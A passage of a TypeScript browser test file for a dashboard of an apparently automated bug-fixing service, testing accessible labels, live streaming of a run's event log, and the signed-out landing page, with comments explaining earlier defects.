    // ONE STEP AT A TIME means the inputs are no longer all on one screen (10n), so the
    // floor visits each step that HAS one. Asserted by the label's `for`, which only
    // resolves if the `id` is really there.
    const labelled = async (id: string, label: RegExp) => {
      expect(await browser!.text(`label[for=${id}]`), `#${id} has no label`).toMatch(label);
      expect(await browser!.text(`#${id}`), `#${id} does not exist`).not.toBe(MISSING);
    };

    // The review step: the commands, behind `Edit as JSON`.
    await labelled('recipe', /commands/i);

    // The finished step: the two halves of storing a value, behind their own disclosure.
    // A repository with commands already in use is where somebody adds one later.
    await browser!.navigate(`${base}/repos/acme/widgets`);
    visited.push('/repos/acme/widgets (values)');
    // An onboarded repository opens on Start a run, which is correct — its work is done.
    await settle(/start a run/i, '/repos/acme/widgets');
    await clickThrough('[role=tab]:nth-of-type(2)', /ready to test bugs/i, '/repos/acme/widgets#environment');
    await browser!.click('details.quiet:last-of-type > summary');
    await settle(/stored secrets/i, 'the values disclosure');
    await labelled('secret-name', /name/i);
    await labelled('secret-value', /value/i);
  });

  test('the live region exists before there is anything to announce', async () => {
    if (skipped('the live region')) return;
    // Inserting a live region and its content in the same tick announces nothing, which is
    // the single most common way a "we added an aria-live" fix does not work.
    await browser!.navigate(`${base}/repos`);
    visited.push('/repos');
    await settle(/repositories/i, '/repos');
    expect(await browser!.text('[aria-live=polite]')).not.toBe(MISSING);
  });
});

/**
 * A run, WHILE IT HAPPENS.
 *
 * The rest of this file drives runs that are already over, which read their log over
 * `GET /api/runs/:id/events` — and that path works perfectly well with the live one
 * completely broken. It was: the first version of `useTail` assigned `onmessage`, and
 * `sse.ts` writes `event: <type>` on every frame, so nothing was ever delivered. An open
 * connection, a clean console, and a page that said **0 events** for the whole of a run.
 *
 * Nothing already in this repository could have caught it. `test/sse.test.ts` asserts the
 * server's frames are correct — they were. `test/screens.test.tsx` renders the timeline from
 * frames handed to it — they arrived. The defect lived in the two lines between, and the
 * only thing that can see those is a browser with a log growing underneath it.
 */
describe.sequential('a run, while it happens', () => {
  const RUN = '11111111-2222-3333-4444-555555555555';
  let live: StatusServer | null = null;
  let liveBase = '';
  /** The log this fixture is appending to, in order, as a worker would. */
  let log: { run_id: string; seq: number; type: string; payload: unknown; ts: string }[] = [];
  let status = 'attempting';

  const append = (type: string, payload: unknown) => {
    log.push({ run_id: RUN, seq: log.length + 1, type, payload, ts: new Date().toISOString() });
    if (type === 'PR_OPENED' || type === 'RUN_ENDED') status = 'pr_opened';
  };

  beforeAll(async () => {
    if (why) return;
    log = [];
    status = 'attempting';
    append('RUN_REQUESTED', { v: 1, source: 'github', thread_ref: `${REPO}#41`, raw_text: 'the cart total is wrong' });
    const row = () => ({
      run_id: RUN,
      repo: REPO,
      issue_number: 41,
      status,
      started_at: new Date(Date.now() - 60_000),
      ended_at: null,
      tier: 2,
      confidence: 90,
      ceiling: 103,
      scoring: 2,
      regression: 'clean',
      pr_url: null,
      last_seq: log.length,
    });
    const client = {
      query: async (sql: string, params: unknown[] = []) => {
        const rows = sql.includes('from run_projection')
          ? [row()]
          : sql.includes('from events')
            ? log.filter((event) => event.seq > Number(params[1] ?? 0))
            : [];
        return { rows, rowCount: rows.length };
      },
    } as unknown as Db;
    live = await startStatusServer({
      // EXPLICITLY EPHEMERAL, and asserted below. This file once failed with
      // `ERR_UNSAFE_PORT` at `http://127.0.0.1:1/` — Chrome refuses a set of low ports
      // outright — and the failure surfaced fifteen seconds later as "the turns never
      // reached /agent worked for/", which reads as a bug in the live view rather than as a
      // fixture that never came up.
      port: 0,
      // The real tail, over a log that is still being written.
      read: async (_runId, after) => log.filter((event) => event.seq > after) as never,
      routes: chain(dashboardRoutes({ client, installUrl: INSTALL_URL }), staticRoutes()),
    });
    if (!live.port || live.port < 1024) {
      why = `the live fixture bound port ${live.port}, which a browser will not open`;
      return;
    }
    liveBase = `http://127.0.0.1:${live.port}`;
  });

  afterAll(async () => {
    // AWAY FROM THE PAGE FIRST. The browser is shared for the whole file, and this test
    // leaves it on a run page holding an `EventSource`. Closing the server under an open
    // stream makes the browser retry against a dead port and write
    // `net::ERR_CONNECTION_REFUSED` into the console — which the next test then reads as
    // its own, because `console()` accumulates.
    try {
      if (browser) await browser.navigate('about:blank');
    } catch {
      // The browser is gone, which is the outer `afterAll`'s business rather than this one's.
    }
    await live?.close();
    live = null;
  });

  test('fills in as the events land, and becomes a verdict when they stop', async () => {
    if (skipped('the live run')) return;
    const before = browser!.console();
    // The fixture answered, before anything waits on what it says. A `settle` against a
    // browser error page burns its whole timeout and then blames the feature.
    expect((await fetch(`${liveBase}/api/runs/${RUN}/events`)).status, 'the live fixture is not serving').toBe(200);
    await browser!.navigate(`${liveBase}/runs/${RUN}`);
    visited.push(`/runs/${RUN} (live)`);

    // Connected, and saying so. Not "0 events" — the first frame is already in the log, so
    // a stream that delivers nothing is visible right here.
    await settle(/the run was requested/i, 'the live run');
    expect(await browser!.text()).toMatch(/live/i);

    // The seal, reported from the probe INSIDE the sandbox, which is the only thing that
    // answers the question at all.
    // `probe: { … }`, which is the shape `SandboxSealedV1` declares and
    // `executor-vercel.ts` emits. A flat `dns`/`route` here would test the guess rather
    // than the engine — which is exactly how the flat read shipped.
    append('SANDBOX_SEALED', { v: 1, sandbox_id: 'sbx-1', phase: 'base', policy: 'deny-all', probe: { dns: false, route: false } });
    expect(await settle(/no DNS and no route out/i, 'the seal')).toMatch(/sandbox was sealed/i);

    // Hundreds of these arrive in a real run. One row, with a count, and the word that says
    // what it is worth.
    for (let n = 0; n < 5; n += 1) append('AGENT_MESSAGE', {});
    expect(await settle(/agent worked for/i, 'the turns')).toMatch(/input to no verdict/i);

    // Base red for the reported symptom.
    append('TEST_RUN', { v: 1, phase: 'base', attempt: 1, exit_code: 1, symptom_matched: true, commit_sha: 'aaaa1111bbbb', stdout_hash: 'sha256:b0' });
    expect(await settle(/symptom present/i, 'base red')).toMatch(/exit 1/);

    // And the transition. `RUN_ENDED` is what tells the page to re-read the fold; the fold
    // is what turns "verdict not yet" into a tier. Nothing here computes that in the browser.
    append('PR_OPENED', { v: 1, repo: REPO, pr_number: 12, head_sha: 'bbbb2222cccc', diff_hash: 'sha256:d' });
    // `reason`, not `status`. The payload has one of those names.
    append('RUN_ENDED', { v: 1, reason: 'pr_opened' });
    const done = await settle(/tier/i, 'the verdict');
    expect(done).toMatch(/a pull request was opened/i);
    expect(done).not.toMatch(/verdict.{0,20}not yet/i);
    // The live indicator is gone, which is also the tail being closed: a finished run polled
    // forever would be four queries a second per open tab.
    expect(done).not.toMatch(/●\s*live/i);

    // Only what THIS test produced. `console()` accumulates for the whole file, and the
    // throwing-page test above deliberately puts an error in it — so an assertion over the
    // whole buffer here fails on somebody else's intentional throw.
    const since = browser!.console().slice(before.length);
    expect(since, 'the live view logged something').not.toMatch(/^\[(error|warning)\]/im);
  });
});

/**
 * A signed-out visitor, on a surface that HAS accounts.
 *
 * The rest of this file drives the local surface — no `auth`, so `/api/me` answers
 * "signed in by construction" and nothing 401s. That left the hosted path's most common
 * first request untested, and it was firing a doomed one: `me.data` is null on the first
 * render, so the application rendered for a tick, `Repos` mounted, and `GET /api/repos`
 * came back 401. Four of them in the console of the first page anybody loads.
 */
describe.sequential('a stranger on a surface with accounts', () => {
  let hosted: StatusServer | null = null;
  let hostedBase = '';

  beforeAll(async () => {
    if (why) return;
    hosted = await startStatusServer({
      port: 0,
      read: async () => [],
      routes: chain(
        dashboardRoutes({
          client: fixtureClient(),
          installUrl: INSTALL_URL,
          // Accounts exist and nobody is signed in — the hosted plane's ordinary state.
          auth: { session: async () => null, installations: async () => [] },
        }),
        staticRoutes(),
      ),
    });
    hostedBase = `http://127.0.0.1:${hosted.port}`;
  });

  afterAll(async () => {
    await hosted?.close();
    hosted = null;
  });

  test('is shown the way in, and no request is made that cannot succeed', async () => {
    if (skipped('the signed-out path')) return;
    const before = browser!.console();
    await browser!.navigate(`${hostedBase}/repos`);
    visited.push('/repos (signed out)');
    const page = await settle(/sign in/i, '/repos signed out');
    expect(page).toMatch(/there is no account here yet/i);
    expect(page).toContain('SIGN IN WITH GITHUB');

    // THE assertion. A 401 here is not a broken page — it is a request the app should never
    // have made, and the console is the only place it shows.
    const since = browser!.console().slice(before.length);
    expect(since, 'the signed-out page made a request that could not succeed').not.toMatch(/401/);
    expect(since).not.toMatch(/^\[(error|warning)\]/im);
  });

  test('and the front door is the landing page, not the application', async () => {
    if (skipped('the front door')) return;
    // `dashboardRoutes` returns null for `/` when nobody is signed in, so the bundle answers
    // — and the bundle renders the pitch, because `/api/me` says there are accounts and this
    // visitor is not in one.
    await browser!.navigate(`${hostedBase}/`);
    visited.push('/ (signed out)');
    const page = await settle(/fixes the bug and proves the fix/, '/ signed out');
    // ONE door on a surface that has accounts. This asserted `install on github`, which was
    // the old primary call to action — and it sat beside a secondary `Sign in`, for two
    // steps that are sequential rather than alternative. Installing first returns you to
    // this very page with no session; the way in is signing in, which the old copy admitted
    // in as many words while keeping install as the primary button.
    expect(page).toMatch(/continue with github/i);
    expect(page).not.toMatch(/install on github/i);
  });
});
